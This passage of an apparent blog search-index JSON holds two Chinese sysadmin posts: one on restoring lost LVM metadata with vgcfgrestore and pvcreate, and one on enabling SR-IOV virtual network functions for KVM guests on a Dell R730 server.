\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; device = \u0026#34;/dev/sda2\u0026#34; # Hint only ... 首先恢复所有的pv，物理卷，这里我们就一个物理卷，所以执行一次，如果有多个物理卷，一个一个来即可\npvcreate --uuid \u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; \\ --restorefile /etc/lvm/archive/VolGroup_00000-444365108.vg 物理卷恢复完了，再恢复lv，逻辑卷：\nvgcfgrestore -f /etc/lvm/archive/VolGroup_00000-444365108.vg VolGroup 弄完后vgdisplay查看一下：\nvgdisplay --- Volume group --- VG Name VolGroup System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 9 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 1 Act PV 1 VG Size 1.64 TiB PE Size 4.00 MiB Total PE 428705 Alloc PE / Size 428705 / 1.64 TiB Free PE / Size 0 / 0 VG UUID 3h3yik-kmqP-Q8sC-5bn0-cwtw-SXpo-orMlKn 就恢复成功了。\n","permalink":"https://rendoumi.com/posts/20240116-lvm_metadata/","summary":"\u003cp\u003e这是个反面教材。在京东数科的时候用的是kvm的虚机系统，同事追求更快，文件镜像用的是raw分区，里面装了lvm。\u003c/p\u003e\n\u003cp\u003egrub的启动文件如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        kernel /vmlinuz-2.6.32-431.el6.x86_64 ro \u003cspan class=\"nv\"\u003eroot\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/mapper/vg_root-lvroot rd_NO_LUKS \u003cspan class=\"nv\"\u003erd_LVM_LV\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evg_root/lvroot \u003cspan class=\"nv\"\u003eLANG\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003een_US.UTF-8 rd_NO_MD \u003cspan class=\"nv\"\u003eSYSFONT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elatarcyrheb-sun16 \u003cspan class=\"nv\"\u003econsole\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ettyS0,115200n8 \u003cspan class=\"nv\"\u003erd_LVM_LV\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evg_root/lvswap  \u003cspan class=\"nv\"\u003eKEYBOARDTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003epc \u003cspan class=\"nv\"\u003eKEYTABLE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eus \u003cspan class=\"nv\"\u003ecrashkernel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eauto rhgb quiet rd_NO_DM\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看上面，root也被建立在lvroot的lvm卷上了。\u003c/p\u003e\n\u003cp\u003e然后就遇到了断电，导致kvm挂掉了，悲催的是lvm卷被破坏了，用尽办法也弄不出来卷信息。因为lvm的metadata没有备份。\u003c/p\u003e\n\u003cp\u003e数据全丢，无法恢复，杯具了。\u003c/p\u003e\n\u003cp\u003e综上LVM的metadata必须备份，方法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcfgbackup  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e/etc/lvm/backup/VolGroup是当前lvm配置的一个备份，而/etc/lvm/archive是归档。\u003c/p\u003e\n\u003cp\u003e看看归档：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -l /etc/lvm/archive/*  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e1820\u003c/span\u003e Jun \u003cspan class=\"m\"\u003e12\u003c/span\u003e  \u003cspan class=\"m\"\u003e2015\u003c/span\u003e /etc/lvm/archive/VolGroup_00000-444365108.vg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e恢复方法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcfgrestore  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e具体恢复的步骤： 首先查看blkid，看看硬盘分区的UUID\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eblkid  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/VolGroup-LogVol01: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;d6d24cc3-5e4a-4f4d-a0b1-2524e727b0fe\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ext4\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3d0103ac-1b18-4da5-bc20-4b7a980a55c0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ext4\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;LVM2_member\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/VolGroup-LogVol00: \u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;06fe7af0-dee5-494a-9b5b-11bf95244acd\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;swap\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e查看lvm信息，找出里面所有物理卷的UUID：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eless /etc/lvm/archive/VolGroup_00000-444365108.vg  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        physical_volumes \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                pv0 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/dev/sda2\u0026#34;\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# Hint only\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e首先恢复所有的pv，物理卷，这里我们就一个物理卷，所以执行一次，如果有多个物理卷，一个一个来即可\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epvcreate --uuid \u003cspan class=\"s2\"\u003e\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --restorefile /etc/lvm/archive/VolGroup_00000-444365108.vg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e物理卷恢复完了，再恢复lv，逻辑卷：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcfgrestore -f /etc/lvm/archive/VolGroup_00000-444365108.vg VolGroup  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e弄完后vgdisplay查看一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgdisplay  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --- Volume group ---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Name               VolGroup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  System ID             \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Format                lvm2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Metadata Areas        \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Metadata Sequence No  \u003cspan class=\"m\"\u003e9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Access             read/write\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Status             resizable\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MAX LV                \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Cur LV                \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Open LV               \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Max PV                \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Cur PV                \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Act PV                \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG Size               1.64 TiB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  PE Size               4.00 MiB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Total PE              \u003cspan class=\"m\"\u003e428705\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Alloc PE / Size       \u003cspan class=\"m\"\u003e428705\u003c/span\u003e / 1.64 TiB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Free  PE / Size       \u003cspan class=\"m\"\u003e0\u003c/span\u003e / \u003cspan class=\"m\"\u003e0\u003c/span\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  VG UUID               3h3yik-kmqP-Q8sC-5bn0-cwtw-SXpo-orMlKn\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e就恢复成功了。\u003c/p\u003e","title":"LVM卷必须备份metadata"},{"content":"什么是SR-IOV呢?\n简单的说，SR-IOV是一种虚拟化方案，用来使一个PCIe的物理设备，能虚拟出多个设备，这些虚拟出来的设备看起来就像是多个真实的物理设备一样，并获得能够与本机性能媲美的 I/O 性能。\nSR-IOV现在最多是用在网卡上，kvm虚拟机的网卡功能一般会下降到实体机的30-50%，如果改用SR-IOV会大大提高网卡性能。\nSR-IOV 有2种功能：\n物理功能 (Physical Function, PF) 就是标准的PCIe的功能了 虚拟功能 (Virtual Function, VF) 与物理功能关联的一种功能。VF 是一种轻量级 PCIe 功能，可以与物理功能以及与同一物理功能关联的其他 VF 共享一个或多个物理资源。VF 仅允许拥有用于其自身行为的配置资源。 好的，如何在生产环境中使用它呢？\n场景如下： 如上： 机房里有两台交换机:\nswitch-1用来连接各机器的eth0口 switch-2用来连接各机器的eth1口 switch-1和switch-2互联 这是一种机房的标准连法，eth0和eth1做bonding，做线路冗余 server-2是一台Dell R730的服务器，eth0连switch-1，eth1连switch-2，上面跑了三个虚机：\nVM-1跑在基于bonding的Bridge上，标准的做法 VM-2和VM-2则是利用了SR-IOV，从虚拟网卡直连到物理网卡，减少了中间环节，提高了网卡的效率。 首先要把服务器的vt和sr-iov打开：\nSystem BIOS \u0026gt; Processor Settings \u0026gt; Virtualization Technology\nSystem BIOS \u0026gt; Integrated Devices \u0026gt; SR-IOV Global Enable 当然，这么麻烦的事情，我们直接用脚本通过idrac调用racadm来做好了：\n#!/bin/sh sshpass -p \u0026#34;xxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.ProcSettings.ProcVirtualization Enabled sshpass -p \u0026#34;calvin\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.IntegratedDevices.SriovGlobalEnable Enabled sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle 注意，Dell R730的机器用得是Intel I350的以太网卡，每个网口最多支持8个VF，如果是高级的X520网卡，就支持64个VF。\n查看一下网卡，有以太网卡i350也有光卡82599ES：\nlspci | grep net 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 19:00.0 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01) 19:00.1 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01) 82599ES 10G的卡，再看支持多少\ncat /sys/class/net/em1/device/sriov_totalvfs 63 支持64个vfs\nCentos 6编辑核心重启系统：\nvi /boot/grub/grub.conf kernel后加个参数intel_iommu=on kernel /vmlinuz-2.6.32-504.el6.x86_64 ro root=UUID=16154774-dbaf-4fcb-aedb-0513cb65a0eb rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet intel_iommu=on Centos 7编辑核心重启系统：\nkernel后加个参数，只虚两个网卡就好，intel_iommu=on ixgbe.max_vfs=2 vi /etc/default/grub GRUB_CMDLINE_LINUX=\u0026#34;crashkernel=auto rhgb quiet intel_iommu=on ixgbe.max_vfs=2\u0026#34; grub2-mkconfig -o /boot/grub2/grub.cfg 先lspci看看设备：\nlspci 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.2 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.3 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) lspci -v 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) Subsystem: Dell Gigabit 4P I350-t rNDC Flags: bus master, fast devsel, latency 0, IRQ 46 Memory at 91e00000 (32-bit, non-prefetchable) [size=1M] Memory at 91f0c000 (32-bit, non-prefetchable) [size=16K] Expansion ROM at 91f80000 [disabled] [size=512K] Capabilities: [40] Power Management version 3 Capabilities: [50] MSI: Enable- Count=1/1 Maskable+ 64bit+ Capabilities: [70] MSI-X: Enable+ Count=10 Masked- Capabilities: [a0] Express Endpoint, MSI 00 Capabilities: [e0] Vital Product Data Capabilities: [100] Advanced Error Reporting Capabilities: [140] Device Serial Number ec-f4-bb-ff-ff-d9-96-43 Capabilities: [150] Alternative Routing-ID Interpretation (ARI) Capabilities: [160] Single Root I/O Virtualization (SR-IOV) Capabilities: [1a0] Transaction Processing Hints Capabilities: [1c0] Latency Tolerance Reporting Capabilities: [1d0] Access Control Services Kernel driver in use: igb Kernel modules: igb 注意上面有一行表示是支持的： Capabilities: [160] Single Root I/O Virtualization (SR-IOV)\n然后我们必须激活VFs，上面我们lspci查看四个I350网卡的usb id，em1是01:00.0，em2是01:00.1，em3是01:00.2，em4是01:00.4，激活em1和em2的VFs：\necho 7 \u0026gt; /sys/bus/pci/devices/0000\\:01\\:00.0/sriov_numvfs echo 7 \u0026gt; /sys/bus/pci/devices/0000\\:01\\:00.0/sriov_numvfs 见鬼了，最大是8个，这里最多只能建7个。lspci看看，从第5行起，多了14个虚拟网卡（一个网卡7个）：\nlspci|grep I350 01:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.2 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:00.3 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 01:10.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:10.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:10.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:10.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:11.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:12.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:13.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 01:13.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 这时系统中会多出14个网卡：\nip link show 12: eth0: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether ea:c0:8c:e1:e8:6d brd ff:ff:ff:ff:ff:ff 13: eth1: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether e6:7f:65:3a:94:cf brd ff:ff:ff:ff:ff:ff 14: eth2: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether a2:39:5e:a7:5c:17 brd ff:ff:ff:ff:ff:ff 15: eth3: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 9a:dd:4a:14:87:48 brd ff:ff:ff:ff:ff:ff 16: eth4: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 2a:07:15:af:44:1c brd ff:ff:ff:ff:ff:ff 17: eth5: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 42:6c:7c:11:1f:40 brd ff:ff:ff:ff:ff:ff 18: eth6: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 86:5f:69:12:48:56 brd ff:ff:ff:ff:ff:ff 19: eth7: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 72:d7:d0:0a:6a:86 brd ff:ff:ff:ff:ff:ff 20: eth8: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 22:4f:16:83:40:83 brd ff:ff:ff:ff:ff:ff 21: eth9: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 1e:a1:10:50:82:cd brd ff:ff:ff:ff:ff:ff 22: eth10: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether de:d7:35:6f:8a:8b brd ff:ff:ff:ff:ff:ff 23: eth11: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether ce:ab:e1:81:0e:31 brd ff:ff:ff:ff:ff:ff 24: eth12: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether d6:35:8e:ed:d9:1d brd ff:ff:ff:ff:ff:ff 25: eth13: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 52:c5:00:45:74:2c brd ff:ff:ff:ff:ff:ff 定义两个网络池，只要指定指定pf即可，vf会动态分配给虚机：\ncat net01.xml \u0026lt;network\u0026gt; \u0026lt;name\u0026gt;passthrough_em1\u0026lt;/name\u0026gt; \u0026lt;forward mode=\u0026#39;hostdev\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; \u0026lt;pf dev=\u0026#39;em1\u0026#39;/\u0026gt; \u0026lt;/forward\u0026gt;\u0026lt;/network\u0026gt; \u0026lt;/network\u0026gt; cat net02.xml \u0026lt;network\u0026gt; \u0026lt;name\u0026gt;passthrough_em2\u0026lt;/name\u0026gt; \u0026lt;forward mode=\u0026#39;hostdev\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; \u0026lt;pf dev=\u0026#39;em2\u0026#39;/\u0026gt; \u0026lt;/forward\u0026gt;\u0026lt;/network\u0026gt; \u0026lt;/network\u0026gt; 启动这2个网络：\nvirsh net-define net01.xml virsh net-start passthrough_em1 virsh net-autostart passthrough_em1 virsh net-define net02.xml virsh net-start passthrough_em2 virsh net-autostart passthrough_em2 modprobe vfio 我们编辑虚机的xml配置文件\n... \u0026lt;interface type=\u0026#34;network\u0026#34;\u0026gt; \u0026lt;source network=\u0026#34;passthrough_em1\u0026#34;/\u0026gt; \u0026lt;/interface\u0026gt; \u0026lt;interface type=\u0026#34;network\u0026#34;\u0026gt; \u0026lt;source network=\u0026#34;passthrough_em2\u0026#34;/\u0026gt; \u0026lt;/interface\u0026gt; ... ok， 启动虚机即可。\n注意，em1和em2的bonding参数，在实体机和虚机中的bonding配置是一样的：\nBONDING_OPTS=\u0026#34;miimon=80 mode=1 primary=eth0 updelay=30000\u0026#34; 为避免频繁切换，updelay设置为30秒\n例外： 实机和虚机的bonding是一样的，如果实机网卡eth0坏了，eth1接管，那么虚机中同样也会飘到eth1。这里有个问题，如果网卡处于bonding状态，那么所有的网卡的mac地址都是一样的，如果eth0挂了，那么bongding的驱动程序会去改变eth1的mac地址，把老的eth0的地址赋给eth1，在实体机上，mac都一样，所以会拒绝，但是在虚机上却会成功，这样就导致虚机和实机在同一个网卡上有两个不同的mac地址，发到虚机上eth1的包会被当成mac spoof而被丢掉。\n解决方法是bonding参数加上failovermac=active 或者设置spoofchk off，得把所有虚拟vf都弄一遍\nip link set em1 vf 1 spoofchk off ... ip link set em1 vf 7 spoofchk off ","permalink":"https://rendoumi.com/posts/20240115-kvm_sriov/","summary":"\u003cp\u003e什么是SR-IOV呢?\u003c/p\u003e\n\u003cp\u003e简单的说，SR-IOV是一种虚拟化方案，用来使一个PCIe的物理设备，能虚拟出多个设备，这些虚拟出来的设备看起来就像是多个真实的物理设备一样，并获得能够与本机性能媲美的 I/O 性能。\u003c/p\u003e\n\u003cp\u003eSR-IOV现在最多是用在网卡上，kvm虚拟机的网卡功能一般会下降到实体机的30-50%，如果改用SR-IOV会大大提高网卡性能。\u003c/p\u003e\n\u003cp\u003eSR-IOV 有2种功能：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e物理功能 (Physical Function, PF)\n\u003cul\u003e\n\u003cli\u003e就是标准的PCIe的功能了\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e虚拟功能 (Virtual Function, VF)\n\u003cul\u003e\n\u003cli\u003e与物理功能关联的一种功能。VF 是一种轻量级 PCIe 功能，可以与物理功能以及与同一物理功能关联的其他 VF 共享一个或多个物理资源。VF 仅允许拥有用于其自身行为的配置资源。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e好的，如何在生产环境中使用它呢？\u003c/p\u003e\n\u003cp\u003e场景如下： \u003cimg alt=\"image-20240115165320492\" loading=\"lazy\" src=\"/posts/20240115-kvm_sriov/image-20240115165320492.png\"\u003e\u003c/p\u003e\n\u003cp\u003e如上： 机房里有两台交换机:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eswitch-1用来连接各机器的eth0口\u003c/li\u003e\n\u003cli\u003eswitch-2用来连接各机器的eth1口\u003c/li\u003e\n\u003cli\u003eswitch-1和switch-2互联\u003c/li\u003e\n\u003cli\u003e这是一种机房的标准连法，eth0和eth1做bonding，做线路冗余\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eserver-2是一台Dell R730的服务器，eth0连switch-1，eth1连switch-2，上面跑了三个虚机：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eVM-1跑在基于bonding的Bridge上，标准的做法\u003c/li\u003e\n\u003cli\u003eVM-2和VM-2则是利用了SR-IOV，从虚拟网卡直连到物理网卡，减少了中间环节，提高了网卡的效率。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e首先要把服务器的vt和sr-iov打开：\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eSystem BIOS \u0026gt; Processor Settings 